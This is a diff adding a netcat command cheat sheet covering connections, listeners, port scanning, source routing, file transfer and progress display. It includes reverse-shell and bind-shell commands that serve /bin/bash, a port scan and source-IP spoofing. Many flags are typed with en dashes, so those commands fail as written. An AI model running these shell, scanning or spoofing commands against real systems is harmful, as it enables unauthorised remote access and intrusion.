@@ -1,0 +1,106 @@
+Netcat Commands
+===============
+Netcat also know as the swiss army knife of network tools, provides a plethora of functions 
+that can be used for good as well as motives that are negative. The following netcat command 
+allow you to perform some of the basic functions of netcat. 
+
+Connect to a port on a remote host			
+----------------------------------
+
+	nc remote_host <port>
+
+	
+Connect to multiple ports on a remote host	
+------------------------------------------
+
+	nc remote_host <port>…<port>
+	
+For example:
+
+		nc www.somecompanyasanexample.com 21 25 80
+
+		
+Listen on a port for incoming connections	
+-----------------------------------------
+
+	nc –v –l –p <port>
+
+	
+Connect to remote host and serve a bash shell	
+---------------------------------------------
+
+	nc remote_ip <port> –e /bin/bash
+
+Note that Netcat does not support the –e flag by default. To
+make Netcat support the –e flag, it must be re-compiled with
+the DGAPING_SECURITY_HOLE option.
+
+
+Listen on a port and serve a bash shell upon connect	
+----------------------------------------------------
+
+	nc –v –l –p <port> –e /bin/bash
+
+Note that Netcat does not support the –e flag by default. To
+make Netcat support the –e flag, it must be re-compiled with
+the DGAPING_SECURITY_HOLE option.
+
+
+Port scan a remote host	
+-----------------------
+
+	nc –v –z remote_host <port>-<port>
+
+Use the –i flag to set a delay interval:
+
+	nc –i <seconds> -v –z remote_host <port>-<port>
+
+	
+Pipe command output to a netcat request	
+---------------------------------------
+
+	<command> | nc remote_host <port>
+
+For example:
+	echo "GET / HTTP/1.0
+	[enter]
+	[enter]
+	"| nc www.somecompanyasanexample.com 80
+
+	
+Use source-routing to connect to a port on a remote host	
+--------------------------------------------------------
+
+	nc –g <gateway> remote_host <port>
+
+Note: Up to eight hop points may be specified using the –g flag.
+Use the –G flag to specify the source-routing pointer.
+Spoof source IP
+address	Use the –s flag to spoof the source IP address:
+nc –s spoofed_ip remote_host port
+This command will cause the remote host to respond back to the
+spoofed IP address. The –s flag can be used along with most of
+the commands presented in this table.
+
+
+Transfer a file	
+---------------
+On the server host:
+	nc –v –l –p <port> < <file>
+On the client host:
+	nc –v <server_host> <port> > <file>
+	
+It is also possible for the client host to listen on a port in order to
+receive a file. To do this, run the following command 
+on the client host:
+	nc –v –l –p <port> > file
+And run the following command on the server host:
+	nc –v <client_host> <port> < file
+	
+To display progress bar during file transfer:
+
+	cat backup.iso | pv -b | nc -l 3333	
+	
+,where pv - Pipe Viewer - is a terminal-based tool for monitoring the progress 
+of data through a pipeline. 
+	
